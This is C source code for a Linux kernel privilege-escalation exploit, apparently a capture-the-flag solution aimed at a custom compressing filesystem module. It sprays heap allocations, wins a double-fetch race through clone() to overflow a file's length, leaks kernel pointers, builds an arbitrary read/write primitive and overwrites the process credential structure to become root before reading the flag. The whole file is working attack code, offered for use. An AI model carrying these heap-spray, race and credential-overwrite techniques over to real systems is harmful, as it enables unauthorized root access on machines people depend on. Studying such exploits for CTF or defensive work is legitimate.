#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sched.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/types.h>

#define SIZE 0x3aa
#define NFILES 0x1c00 
#define STEP 20

char uncompressed_buf[0x100];
char victim_buf[0x1000];
char buf[SIZE];
char name_buf[0x20];
char corrupted_filename[0x20];
char* name_fmt = "test_dir/a%d";
char read_file[0x30];
char garbage_buf[0x1000];

// writes 'C' using uint64_t to make sure we get compiled to a MOV QWORD [...]. val
int modify(void* args) {
    *((uint64_t*) buf) = 0x4343434343434343;
    *((uint64_t*) buf + 1) = 0x4343434343434343;
    return 0;
}

// generate the string for a given byte using A and B which is what I used throughout the exploit
void write_string_for_byte(char* buf, uint8_t byte) {
    uint8_t c;
    for (int i = 0; i < 8; ++i) {
        c = byte & (1 << i) ? 0x41 : 0x42;
        *buf++ = c;
    }
}

void write_string_for_qword(char* buf, uint64_t val) {
    for (int i = 0; i < 8; ++i) {
        uint8_t byte = (val >> (i * 8)) & 0xff;
        write_string_for_byte(buf + (i * 8), byte);
    }
}

uint64_t read_qword(uint64_t addr, uint64_t* leaked) {
    char target_ptr_string[64];
    uint64_t val;
    ssize_t ret;

    write_string_for_qword(target_ptr_string, addr - 4);
    FILE* fd = fopen(corrupted_filename, "w+");
    // seek to the pointer of the contiguous meta structure
    fseek(fd, 486*2 + 1 + 128 + 64, SEEK_SET);
    // overwrite the pointer 
    write(fileno(fd), target_ptr_string, 64);
    fclose(fd);

    // read 8 byte from address, this assumes that the corrupted pointer
    // belongs to a structure for an uncompressed file otherwise it would attempt
    // to dereference the pointer to retrieve the length
    fd = fopen(read_file, "w+");
    ret = read(fileno(fd), (char*) &val, 8);
    if (ret < 0) {
        return 0;
    }
    fclose(fd);
    *leaked = val;
}

uint64_t read_n_bytes(uint64_t addr, char* leaked, uint16_t n) {
    char target_ptr_string[64];
    ssize_t ret;

    write_string_for_qword(target_ptr_string, addr - 4);
    FILE* fd = fopen(corrupted_filename, "w+");
    fseek(fd, 486*2 + 1 + 128 + 64, SEEK_SET);
    write(fileno(fd), target_ptr_string, 64);
    fclose(fd);

    fd = fopen(read_file, "w+");
    ret = read(fileno(fd), leaked, n);
    fclose(fd);
    if (ret < 0) {
        return 0;
    }
    return 1;
}



// this method only works with my string which "A"*486 + "B" * 486,
// an A means the bit is set to 1, B means it is not set
uint64_t get_byte(char* buf) {
    uint64_t byte = 0;
    for (int i = 0; i < 8; ++i) {
        if (*buf != 'A' && *buf != 'B') {
            printf("unexpected character %c.... aborting!\n", *buf);
            exit(1);
        }
        if (*buf == 'A')
            byte += (1 << i);
        buf++;
    }
    return byte;
}

uint64_t get_qword(char* buf) {
    return get_byte(buf) +
        (get_byte(buf + 8) << 8) +
        (get_byte(buf + 16) << 16) +
        (get_byte(buf + 24) << 24) +
        (get_byte(buf + 32) << 32) +
        (get_byte(buf + 40) << 40) +
        (get_byte(buf + 48) << 48) +
        (get_byte(buf + 56) << 56);
}

uint64_t get_dword(char* buf) {
    return get_byte(buf) +
        (get_byte(buf + 8) << 8) +
        (get_byte(buf + 16) << 16) +
        (get_byte(buf + 24) << 24);
}

uint64_t get_addr_of_task_comm() {
    FILE* fd = fopen("test_dir/christmas_gift", "w+");

    char buf[8];
    read(fileno(fd), buf, 0x1337);

    return (*(uint64_t*) buf) + 0xaa8;
    
}

void read_from_corrupted_file() {

    FILE* fd = fopen(corrupted_filename, "w+");
    read(fileno(fd), garbage_buf, 0x3cd + 64 + 64 + 64 + 64 + 64 + 64 );
    fclose(fd);
}

int main(void) {

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    char* stack = mmap(0, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);

    // We target kmemcache_128 so create two buffers that will fit in that slab

    // set up attacking buffer
    // "C" + "A" * 0x390 + "B" * 0x18
    memset(buf, 'A', 0x391);
    buf[0] = 'C';
    memset(buf + 0x391, 'B', 0x18);

    // uncompressed buffer below does not work because of copy_to_user checking heap objects
    for (int i = 0x20; i < 0x7d; i++) {
        uncompressed_buf[i - 0x20] = (char) i;
    }
    uncompressed_buf[0x7d] = 'A';
    uncompressed_buf[0x7e] = 'A';
    uncompressed_buf[0x7f] = 'A';
    uncompressed_buf[0x80] = 'A';
    uncompressed_buf[0x81] = 'A';
    uncompressed_buf[0x82] = 'A';


    // use a buffer which produces a balanced huffman tree
    for (int i = 0; i < 486; ++i) {
        victim_buf[i] = 'A';
    }
    for (int i = 0; i < 486; ++i) {
        victim_buf[i + 486] = 'B';
    }


    // spray large number of files: we have to deal with freelist randomization so strategy is:
    // - spray a lot of files so that we should end up with a lot of contiguous allocations eventually
    // - free 1 out of N files (N = 10 for now) so that we are confident next allocations will be next to a victim
begin:
    for (int i = 0; i < NFILES; ++i) {
        sprintf(name_buf, name_fmt, i);
        FILE* fd = fopen(name_buf, "w+");
        write(fileno(fd), victim_buf, strlen(victim_buf)); // safe to use strlen here
        fclose(fd);
    }
    for (int i = 0; i < NFILES; i += STEP) {
        sprintf(name_buf, name_fmt, i);
        remove(name_buf);
    }

    // Now exploit double fetch to increase the length of a compressed file by triggering some bits overflow
    for (int i = 0; i < NFILES; i += STEP) {
        sprintf(name_buf, name_fmt, i);
        FILE* fd = fopen(name_buf, "w+");
        *((uint64_t*) buf) = 0x4141414141414143;
        *((uint64_t*) buf + 1) = 0x4141414141414141;
        pid_t pid = clone(modify, stack + 0x7000, CLONE_VM, 0);

        if (pid == -1) {
            printf("Clone error\n");
            exit(1);
        }

        write(fileno(fd), buf, SIZE - 1);
        int status;

        if (waitpid(pid, &status, __WCLONE) != pid) {
            return 1;
        }
        if (!WIFEXITED(status) || !WEXITSTATUS(status) == 0) {
            printf("ERROR\n");
            exit(1);
        }
        fclose(fd);
    }

    int needle = -1;
    // now let's read 0x3cd in each files 
    for (int i = 0; i < NFILES; ++i) {
        sprintf(name_buf, name_fmt, i);
        FILE* fd = fopen(name_buf, "w+");
        if (read(fileno(fd), garbage_buf, 0x3cd) == 0x3cd) {
            // the original file would be 0x3cc in length so read would never return 0x3cd unless we corrupted it
            needle = i;
            break;	
        }
        fclose(fd);
    }

    if (needle == -1) {
        goto cleanup_and_retry;
    }

    sprintf(corrupted_filename, name_fmt, needle);
    printf("Overflown file is %s\n", corrupted_filename);

    printf("Cleaning other files\n");
    for (int i = 0; i < NFILES; ++i) {
        if (i == needle)
            continue;
        sprintf(name_buf, name_fmt, i);
        remove(name_buf);
    }

    printf("Leaking some stuff\n");	
    read_from_corrupted_file();

    uint64_t qword = get_qword(garbage_buf + 0x3cd);
    printf("Leaked qword @ 0x%lx\n", qword);
    uint64_t qword2 = get_qword(garbage_buf + 0x3cd + 64);
    printf("Leaked qword @ 0x%lx\n", qword2);

    uint64_t heap = qword;
    uint64_t backup_pointer;

    // Now we want to create a situation where a meta-data structure for an uncompressed file
    // is created right after our corrupted file
    uint8_t found = 0;
    for (int i = 0; i < NFILES; ++i) {
        if (i == needle) 
            continue;
        sprintf(name_buf, name_fmt, i);
        FILE* fd = fopen(name_buf, "w+");
        write(fileno(fd), uncompressed_buf, strlen(uncompressed_buf)); // safe to use strlen here
        fclose(fd);
        read_from_corrupted_file();
        qword = get_qword(garbage_buf + 0x3cd);
        // the file system logs the name of the calling process (task->comm) who created a file
        // my exploit therefore needs to be compiled into a binary called WVUTSRQPONMLKJI
        if (qword == 0x5051525354555657) { 
            qword2 = get_qword(garbage_buf + 0x3cd + 64);
            if (qword2 != 0x494a4b4c4d4e4f)
                continue;
            printf("Marker found at iteration %d\n", i);
            sprintf(read_file, name_fmt, i);
            qword2 = get_qword(garbage_buf + 0x3cd + 64 + 64);
            if (qword2 != 0)
                continue;
            backup_pointer = get_qword(garbage_buf + 0x3cd + 64 + 64 + 64);
            printf("Expecting qword being 0, Leaked qword @ 0x%lx\n", qword2);
            found = 1;
            break;
        }

    }

    if (!found) {
        printf("Marker not found\n");
        goto cleanup_and_retry;
    }

    read_from_corrupted_file();
    uint64_t leaked;
    uint64_t cred;
    uint64_t real_cred;

    uint64_t comm = get_addr_of_task_comm();
    printf("Task->comm is at 0x%lx\n", comm);
    if (!read_qword(comm - 16, &real_cred)) {
        printf("huh...\n");
    } 
    printf("real_cred is at 0x%lx\n", real_cred);

   
    char yolo[64]; 
    read_n_bytes(real_cred, yolo, 64);
    // read in the content of the credentials content, I do that because the structure is marked as being randomized
    // but that might not have been the case on remote actually but makes no difference really


    // fields corresponding to our UID/EUID etc.. would be set to 1000, so if they are change that to 0
    uint32_t val;
    for (int i = 0; i < 16; ++i) {
        val = *(((uint32_t*) yolo) + i);
        if (val = 1000) {
            *(((uint32_t*) yolo) + i) = 0x0;
        }
    }
    printf("Currently id %d\n", getuid());
    FILE* fd = fopen(read_file, "w+");
    // write back change cred structure
    write(fileno(fd), yolo, 64);
    fclose(fd);

    if (getuid() != 0) {
        printf("no luck\n");
    } else {
        printf("G0t r00t!!\n");
        system("cat flag");
    }
    
    return 0;


cleanup_and_retry:
    puts("Exploit failed, retrying ...");
    for (int i = 0; i < NFILES; ++i) {
        sprintf(name_buf, name_fmt, i);
        remove(name_buf);
    }
    goto begin;
}
